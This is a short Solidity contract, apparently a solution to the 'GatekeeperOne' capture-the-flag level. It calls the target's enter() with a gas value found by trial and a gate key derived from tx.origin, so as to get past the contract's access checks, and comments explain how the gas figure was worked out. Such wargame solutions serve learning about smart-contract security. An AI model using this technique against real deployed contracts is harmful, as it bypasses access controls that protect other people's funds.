// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneHack {
    constructor(address gatekeeperOneAddress) {
        // gas can be figured out by checking the result of GAS opcode using the debugger
        // then its easy to calculate the diff from a trial number, say 10000
        // GAS result was 9732
        // 9732 % 8191 = 1541
        // Hence 10000 - 1541 = 8459 gives out of gas
        // 8459 + 8191 = 16650 gives out of gas
        // 16650 + 8191 = 24841 works fine
        IGatekeeperOne(gatekeeperOneAddress).enter{gas: 24841}(
            bytes8(uint64(uint32(uint16(uint160(tx.origin))))) | bytes8(bytes4(0x00000011))
        );
    }
}
